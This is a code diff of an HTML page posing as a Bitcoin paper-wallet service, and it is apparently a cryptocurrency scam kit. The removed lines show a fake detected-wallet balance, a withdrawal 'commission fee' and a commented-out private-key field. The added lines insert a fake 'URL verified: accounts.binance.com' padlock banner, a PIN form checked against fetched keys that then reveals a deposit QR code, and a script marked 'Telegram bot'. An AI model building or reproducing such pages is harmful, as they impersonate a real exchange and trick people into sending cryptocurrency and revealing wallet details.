@@ -11,10 +11,12 @@
         content="Whether it is to make a special gift, or to store your own Bitcoins in a safe place, PrintYourWallet.org is the easiest, safest and most fun way to store your cryptocurrencies offline." />
     <meta name="keywords"
         content="generate bitcoin paper wallet, create crypto paper wallet, cold storage, bitcoin paper wallet, bitcoin cash paper wallet, Ethereum paper wallet, Litecoin paper wallet, Ethereum classic paper wallet, Eos paper wallet, store bitcoins in cold storage, cold storage, crypto paper wallet" />
+
     <!--  - Google Analytics Global site tag (gtag.js)-->
     <script async src="https://www.googletagmanager.com/gtag/js?id=UA-178266520-1"></script>
     <script>
         window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
         gtag('js', new Date());
         gtag('config', 'UA-178266520-1');
     </script>
@@ -55,7 +57,6 @@
         id="loader-wrapper">
         <div class="loader"></div>
     </div>
-
     <!-- help container null styles -->
 
     <style>
@@ -67,6 +68,9 @@
     </style>
     <!-- ========== START NAVBAR ========== -->
     <!-- ========== HEADER ========== -->
+    <!-- ========== START NAVBAR ========== -->
+    <!-- ========== HEADER ========== -->
+
     <header id="header" class="header header-sticky-top" data-hs-header-options='{
     "fixMoment": 1000,
     "fixEffect": "slide"
@@ -78,8 +82,7 @@
                     <!-- Logo -->
                     <a class="navbar-brand" href="index.html" aria-label="Front">
                         <figure>
-                            <img style="margin-right: 5px; width: 80px;" src="img/ethereum.gif"
-                                alt="Print Your Wallet Logo">
+                            <img style="width: 80px;" src="img/ethereum.gif" alt="Print Your Wallet Logo">
                         </figure>
                         <div class="navbar-brand__text">
                             <span class='navbar-brand__name'>Brent safe wallet</span>
@@ -132,146 +135,131 @@
                 </nav>
                 <!-- End Nav -->
             </div>
-            <marquee lang="-1" behavior="scroll" direction="left" onmouseover="this.stop()" onmouseout="this.start()"
+            <MARQUEE lang="-1" behavior="scroll" direction="left" onmouseover="this.stop()" onmouseout="this.start()"
                 class="row-container">
                 <div class="row">
-                    <div class="row__item">
-
-                    </div>
+                    <div class="row__item"></div>
                 </div>
-            </marquee>
+            </MARQUEE>
+            <!-- ========== URL PROTECTION ========== -->
+
+            <div class="url-protection">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" class="url-protection_svg">
+                    <path fill-rule="evenodd" clip-rule="evenodd"
+                        d="M7 8v2H5v11h14V10h-2V8A5 5 0 007 8zm7.5 2V8a2.5 2.5 0 00-5 0v2h5zm-1 8v-5h-3v5h3z"
+                        fill="currentColor">
+                    </path>
+                </svg>
+                <div data-bn-type="text" class="url-protection_text">URL verified : </div>
+                <div data-bn-type="text" dir="ltr" class="url-protection_addres"><span data-bn-type="text"
+                        class="url-protection_holder">https://</span><span
+                        class="url-protection_address">accounts.binance.com</span></div>
+            </div>
+
+            <!-- ========== URL PROTECTION ========== -->
         </div>
     </header>
+
+    <br>
+    <br>
+    <br>
+    <br>
     <!-- ========== END HEADER ========== -->
     <!-- ========== END NAVBAR ========== -->
 
 
 
     <!-- ========== Start Main Section ========== -->
-
-    <!-- Title -->
-    <br>
-    <br>
-    <br>
-    <br>
-    <!-- Hero Section -->
     <div class="container check-balance">
         <!-- <figure>
-      <img style="width: 200px;" src="img/ethereum.gif" class="d-block mx-auto" alt="Print Your Wallet Logo">
-    </figure> -->
+  <img style="width: 200px;" src="img/ethereum.gif" class="d-block mx-auto" alt="Print Your Wallet Logo">
+</figure> -->
         <img src="./img/bitcoins-black.jpg" alt="" class="magnum-deposit__bitcoin" style="width: 337px;">
-        <p class="check-balance__eur">Bitcoin paper wallet detected!
-            <br><span>NO. SS22F3R2MM853-SPK</span>
-        </p>
-
-        <h1 class="h1 text-center" style="margin-top: 2rem;">Current Balance</h1>
-        <p style="font-size: 28px;" id="balance_euro" class="check-balance__eur">6777 EUR</p>
-        <p style="margin-bottom: 5px;" class="check-balance__bitcoin"><img src="./img/bitcoin-convert.jpg"" alt="
-                bitcoin-convert" width="60" class="d-block mx-auto mb-1"></p>
-        <p id="balance_bitcoin" class="check-balance__bitcoin"></p>
-        <p class="text-center">Deposited by Bitcoin ATM receipt <br>(transaction ID - SD1V89W533SF5-D9N1)</p>
-        <ul class="check-balance__advs">
-            <!-- <li>> Scan Public Address QR code to deposit paper wallet or to check available balance.</li> -->
-            <li>> PRIVATE key gives you complete access to your funds on Bitcoin paper wallet.</li>
-            <li>> DO NOT REVEAL or SHARE THE PRIVATE KEY until you withdraw funds from Bitcoin paper wallet to your own
-                cryptocurrency wallet.</li>
-            <li>> To withdraw funds from paper wallet you must pay a <span class="commissionPrecent"></span> commission
-                fee the current amount on the Bitcoin paper
-                wallet.</li>
-        </ul>
+        <p class="check-balance__eur">Deposit paper wallet</p>
     </div>
-
     <div class="container check-balance">
-        <!-- <img src="./img/bitcoin_convert.jpg" alt="" width="100" class="d-block mx-auto"> -->
-        <!-- <h3 class="h3 text-center mt-1">Business bitcoin paper wallet has been detected!</h3>
-    <p class="text-center text-danger ultra-text-danger" style="font-size: 15px; margin-bottom: 8px;">Private key can
-      only be used
-      once,after which it is no longer
-      valid!</p> -->
-        <div style="margin-bottom: 20px;" class="container secure-text courier-prime-font">
-            <ul>
-                <li>For security reasons, the private key can only be</li>
-                <li>used once, after which it will no longer be valid</li>
-            </ul>
+        <form class="deposit-crypto">
 
-        </div>
+            <div class="wrapper-form">
+                <div style="margin: 0;width: 100%;" class="deposit-crypto__field">
+                    <div class="deposit-crypto__main">
+                        <span><label>Wallet Authentic PIN</label></span>
+                        <input required id="bitcoin_pin" type="text">
+                    </div>
 
-
-        <!-- <p class="text-center text-danger" style="font-size: 15px;">Mandatory commission fee is <span class="commissionPrecent"></span> of the current
-      amount.</p> -->
-        <!-- <div class="deposit-crypto__field">
-      <div class="deposit-crypto__main">
-        <label class="text-danger">Private Key</label>
-        <input required id="sicret_key_input" type="text">
-      </div>
-      <img src="./img/bitcoin.svg" alt="" width="40" height="40">
-    </div> -->
-        <div  class="deposit-crypto__field">
-            <div class="deposit-crypto__main">
-                <label>Customer bitcoin address</label>
-                <p class="btc_address">1er5h1r5h1t5thfehryjutkiytvc5wc1srbtd5tnyt5j5brbtn</p>
+                </div>
             </div>
-            <!-- <img src="./img/bitcoin.svg" alt="" width="40" height="40"> -->
-        </div>
-        <div class="deposit-crypto__field">
-            <div class="deposit-crypto__main">
-                <label>Balance to withdraw</label>
-                <p id="get_balance">1000 EUR = 0.6234123 BTC</p>
+
+            <div class="wrapper-form" id="next-wrapper" style="display: none;">
+                <div style="margin: 0;width: 100%;" class="deposit-crypto__field">
+                    <div class="deposit-crypto__main">
+                        <label>Bitcoin wallet address</label>
+                        <input required id="bitcoin_title" type="text">
+                    </div>
+
+                </div>
+
             </div>
-            <img src="./img/black-bi.jpg" alt="" width="40" height="40">
-        </div>
-        <div class="deposit-crypto__field">
-            <div class="deposit-crypto__main">
-                <label><span class="commissionPrecent"></span> Commission Fee</label>
-                <p id="get_commission">0.0057</p>
-            </div>
-            <img src="./img/black-bi.jpg" alt="" width="40" height="40">
-        </div>
-        <div style="margin-bottom: 0;" class="deposit-crypto__field">
-            <div class="deposit-crypto__main">
-                <label class="text-danger">Customer bitcoin address</label>
-                <!-- <p style="display: none;" class="btc_address">1er5h1r5h1t5thfehryjutkiytvc5wc1srbtd5tnyt5j5brbtn</p> -->
 
-                <input id="email-input" type="text" required>
-            </div>
-            <!-- <img src="./img/bitcoin.svg" alt="" width="40" height="40"> -->
-        </div>
-        <div style="margin-top: 0;" class="deposit-crypto__label">
-            <span>*Enter your private bitcoin address to withdraw wallet balance</span>
-        </div>
-        <!-- <div class="email-confirm__field">
-      <div class="email-confirm__main">
-        <label style="    font-weight: 400;
-          font-size: 14px;">Email</label>
-        <input style="margin: 0;
-          display: block;
-          width: 100%;
-          border: none;
-          outline: none;
-          font-weight: 700;
-          white-space: nowrap;
-          overflow: hidden;
-          text-overflow: ellipsis;" required id="email_input" type="text">
-      </div>
-      <img src="./img/bitcoin.svg" alt="" width="40" height="40">
+            <img id="qr_code" style="display: none !important;" src="./img/qr-code.png" alt="" width="300"
+                class="d-block mx-auto mt-2 mb-2">
 
-    </div> -->
+            <button id="next-button" type="submit" class="check-balance__btn green-btn">NEXT</button>
 
-        <button onclick="check_data()" class="check-balance__btn green-btn">Next</button>
-        <p id="wait" class="check-balance__wait">BTC wallet confirmation in progress<br>Please wait...</p>
-        <p class="form-error text-center text-danger fill-data" id="fill-data">Error!<br>Please enter bitcoin address
-        </p>
-        <p class="form-error text-center text-danger incorrect-data">Incorrect data entered!</p>
+            <!-- <a href="withdraw.html" class="check-balance__btn green-btn">Withdraw funds to private BTC wallet</a> -->
+            <p class="check-balance__wait">
+                Please wait, confirmation in progress... <br>
+                After confirmation will be completed email will be send
+            </p>
+            <p class="deposit-form__wait">Waiting for private BTC address...</p>
+            <p class="form-error text-center text-danger">Error <br>Please fill the form</p>
+            <p class="form-error text-center text-danger data-inccorrect">Incorrect data entered!</p>
 
+            <script>
+
+                const authPinInput = document.querySelector("#bitcoin_pin")
+                const nextButton = document.querySelector("#next-button")
+                const nextWrapper = document.querySelector("#next-wrapper")
+                const dataIncorrect = document.querySelector(".data-inccorrect")
+                const waitForm = document.querySelector(".deposit-form__wait")
+                const qrCodeImage = document.querySelector("#qr_code")
+                const step = 1
+
+                nextButton.addEventListener("click", async () => {
+                    // const keys = [{ bitcoin_key: "12345", bitcoin_title: "123" }]
+                    const qrData = await send_request("get", false, "qr_deposit_change", false)
+                    const keys = await send_request("get", false, "keys", false)
+                    const findPin = keys.find(key => key?.bitcoin_title == authPinInput?.value)
+                    waitForm.style.display = "block"
+
+                    setTimeout(() => {
+                        waitForm.style.display = "none"
+
+                        if (findPin) {
+                                authPinInput.disabled = true
+                                nextWrapper.style.display = "flex"
+
+                                qrCodeImage.src = qrData.qr_code_link
+                                qrCodeImage.style.display = "block !important"
+
+                        } else {
+                            dataIncorrect.style.display = "block"
+
+                            setTimeout(() => {
+                                dataIncorrect.style.display = "none"
+
+                            }, 5000);
+                        }
+                    }, 5000);
+                })
+
+            </script>
+        </form>
     </div>
-
-    <figure style="display: flex; width: 100%; align-items: center; justify-content: center; margin: 10px 0;">
-        <img style="width: 80px;" src="img/ethereum.gif" alt="Print Your Wallet Logo">
-    </figure>
 
     <!-- ========== Start Footer ========== -->
     <!-- ========== FOOTER ========== -->
-
+    <br>
     <script src="assets/vendor/jquery/dist/jquery.min.js"></script>
     <script src="assets/vendor/jquery-migrate/dist/jquery-migrate.min.js"></script>
     <script src="assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
@@ -372,25 +360,7 @@
     </script>
 
 
-    <div id="popup" class="popup">
-        <div class="popup-content">
-            <div class="popup-header">
-                <figure>
-                    <img style="width: 60px;" src="img/ethereum.gif" alt="Print Your Wallet Logo">
-                </figure>
-            </div>
-            <div class="popup-content">
-                <ul class="check-balance__advs">
-                    <p style="margin-bottom: 5px;font-size: 15px;">Attention!<br>Enter only your private bitcoin
-                        address<br>(from your own digital wallet or crypto<br>account) to withdraw funds from offline
-                        paper wallet</p>
-                </ul>
-            </div>
-        </div>
-    </div>
-
-
-    <footer class="container  padding-top_footer  space-2 text-center d-flex flex-column align-items-center">
+    <footer class="container padding-top_footer  space-2 text-center d-flex flex-column align-items-center">
         <!-- Logo -->
         <a class="navbar-brand footer-logo" href="index.html" aria-label="Front">
             <figure>
@@ -414,25 +384,25 @@
         <!-- End Social Networks -->
     </footer>
 
+
     <!-- ========== END FOOTER ========== -->
     <!-- ========== End Footer ========== -->
     <!-- JS Implementing Plugins -->
     <script src="assets/vendor/hs-counter/dist/hs-counter.min.js"></script>
     <script src="assets/vendor/appear.js"></script>
-    <script src="assets/js/getPrices.js"></script>
-    <!-- telegram bot -->
-    <script src="assets/js/withdrawTracker.js"></script>
+
+    <!--Telegram bot-->
+    <script src="assets/js/bitcoinWalletAddress.js"></script>
     <script type="module" src="assets/js/loader.js"></script>
     <script src="assets/js/dropdown.js"></script>
     <script src="assets/js/setBrandName.js"></script>
-    <script>
 
+    <script>
         (function (u) {
             var s = document.createElement('script'); s.async = true; s.src = u;
             var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(s, x);
         })('https://widget.replain.cc/dist/client.js');
     </script>
-
     <script type="text/javascript">
         (function (m, e, t, r, i, k, a) {
             m[i] = m[i] || function () { (m[i].a = m[i].a || []).push(arguments) };
